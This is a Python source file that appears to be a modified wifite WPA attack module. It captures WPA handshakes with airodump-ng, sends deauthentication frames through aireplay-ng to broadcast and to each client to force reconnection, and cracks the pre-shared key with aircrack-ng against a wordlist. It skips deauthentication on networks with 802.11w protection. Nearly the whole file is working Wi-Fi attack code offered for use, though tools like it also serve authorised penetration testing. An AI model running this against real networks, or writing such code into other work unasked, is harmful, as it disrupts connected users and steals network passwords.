from ..model.attack import Attack
from ..tools.aircrack import Aircrack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.process import Process
from ..util.timer import Timer
from ..util.spinner import Spinner
from ..util import handshake_quality
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA

import time
import os
import re
from shutil import copy

class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        '''Initiates full WPA handshake capture attack.
        V3: Respects PMF flag — skips deauth if target has 802.11w enabled.
        '''

        # Skip if only WPS attacks are wanted
        if Configuration.wps_only and self.target.wps == False:
            Color.pl('\r{!} {O}Skipping WPA-Handshake attack on {R}%s{O} because {R}--wps-only{O} is set{W}' % self.target.essid)
            self.success = False
            return self.success

        # Skip if user only wants PMKID attack
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # V3: PMF warning — deauth will be skipped
        if getattr(self.target, 'pmf', False):
            pmf_level = 'REQUIRED' if getattr(self.target, 'pmf_required', False) else 'ENABLED'
            Color.pl('{!} {O}PMF ({C}802.11w{O}) is %s on {C}%s{O}' % (pmf_level, self.target.essid))
            Color.pl('{!} {O}Deauthentication will be {R}skipped{O}. '
                     'Waiting for natural client (re)association...{W}')

        # Capture the handshake
        handshake = self.capture_handshake()

        if handshake is None:
            self.success = False
            return self.success

        Color.pl('')
        result = handshake_quality.analyze(handshake.capfile, bssid=handshake.bssid)
        Color.pl(handshake_quality.render_report(result))

        if result['quality'] == handshake_quality.QUALITY_INVALID:
            Color.pl('{!} {R}Handshake is invalid — aborting crack{W}')
            self.success = False
            return False

        wordlist = getattr(Configuration, '_targeted_wordlist', None) or Configuration.wordlist

        if wordlist is None:
            Color.pl('{!} {O}No wordlist set — skipping crack ({R}--dict{O} to specify){W}')
            self.success = False
            return False

        # Support compressed wordlist (.gz)
        if wordlist.endswith('.gz') and os.path.exists(wordlist):
            import gzip
            decompressed_wl = Configuration.temp('wordlist.txt')
            try:
                Color.pl('{+} {C}Decompressing compressed wordlist {G}%s{W}...' % os.path.basename(wordlist))
                with gzip.open(wordlist, 'rb') as f_in:
                    with open(decompressed_wl, 'wb') as f_out:
                        f_out.write(f_in.read())
                wordlist = decompressed_wl
            except Exception as e:
                Color.pl('{!} {R}Failed to decompress wordlist: {O}%s{W}' % str(e))
                self.success = False
                return False

        if not os.path.exists(wordlist):
            Color.pl('{!} {O}Wordlist not found: {R}%s{W}' % wordlist)
            self.success = False
            return False

        Color.pl('\n{+} {C}Cracking WPA Handshake:{W} {C}aircrack-ng{W} with {C}%s{W}' % os.path.basename(wordlist))

        key = Aircrack.crack_handshake(handshake, show_command=False)
        if key is None:
            Color.pl('{!} {R}Passphrase not found in {O}%s{W}' % os.path.basename(wordlist))
            self.success = False
        else:
            Color.pl('{+} {G}Cracked WPA Handshake{W}  PSK: {G}%s{W}\n' % key)
            self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)
            self.crack_result.dump()
            self.success = True
        return self.success


    def capture_handshake(self):
        '''Returns captured or stored handshake, otherwise None.
        V3: Deauth skipped when target.pmf == True.
        '''
        handshake = None

        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
            airodump_target = self.wait_for_target(airodump)

            self.clients = []

            # Try to load existing handshake
            if Configuration.ignore_old_handshakes == False:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack('WPA', self.target, 'Handshake capture', 'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                    Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                    return handshake

            timeout_timer  = Timer(Configuration.wpa_attack_timeout)
            deauth_timer   = Timer(Configuration.wpa_deauth_timeout)
            target_has_pmf = getattr(self.target, 'pmf', False)
            pmf_tag        = ' \033[33m[PMF]\033[0m' if target_has_pmf else ''
            label          = airodump_target.essid or airodump_target.bssid

            spin = Spinner('WPA capture  %s%s' % (label, pmf_tag))
            spin.start()

            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)

                spin.set_suffix(
                    'clients:\033[92m%d\033[0m  deauth:\033[93m%s\033[0m  timeout:\033[91m%s\033[0m' % (
                        len(self.clients), deauth_timer, timeout_timer))

                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                bssid    = airodump_target.bssid
                essid    = airodump_target.essid if airodump_target.essid_known else None
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    spin.stop(success=True, final_msg='Handshake captured  \033[92m%s\033[0m' % (essid or bssid))
                    break

                handshake = None
                os.remove(temp_file)

                airodump_target = self.wait_for_target(airodump)
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        spin.set_suffix('New client: \033[92m%s\033[0m' % client.station)
                        self.clients.append(client.station)

                if deauth_timer.ended():
                    if not target_has_pmf:
                        self.deauth(airodump_target)
                    else:
                        spin.set_suffix('\033[33mPMF active — deauth skipped\033[0m')
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                time.sleep(step_timer.remaining())

            if handshake is None:
                spin.stop(success=False, final_msg='Handshake capture timed out after %ds' % Configuration.wpa_attack_timeout)
                if target_has_pmf:
                    Color.pl('{!} {O}PMF enabled — try PMKID attack instead{W}')
                return None
            else:
                self.save_handshake(handshake)
                return handshake


    def load_handshake(self, bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        if essid:
            essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
        else:
            essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = r'\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        get_filename = re.compile(r'handshake_%s_%s_%s\.cap' % (essid_safe, bssid_safe, date))

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    def save_handshake(self, handshake):
        '''
            Saves a copy of the handshake file to hs/
        '''
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        if handshake.essid and type(handshake.essid) is str:
            essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        else:
            essid_safe = 'UnknownEssid'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
            handshake.strip(outfile=cap_filename)
            Color.pl('{G}saved{W}')
        else:
            Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
            Color.pl('{G}saved{W}')

        handshake.capfile = cap_filename


    def deauth(self, target):
        '''
            Sends deauthentication request to broadcast and every client.
            V3: This method is only called when target.pmf == False.
        '''
        if Configuration.no_deauth: return

        for index, client in enumerate([None] + self.clients):
            if client is None:
                target_name = '*broadcast*'
            else:
                target_name = client
            Color.clear_entire_line()
            Color.pattack('WPA',
                    target,
                    'Handshake capture',
                    'Deauthing {O}%s{W}' % target_name)
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)


if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')
        pass
    Configuration.exit_gracefully(0)
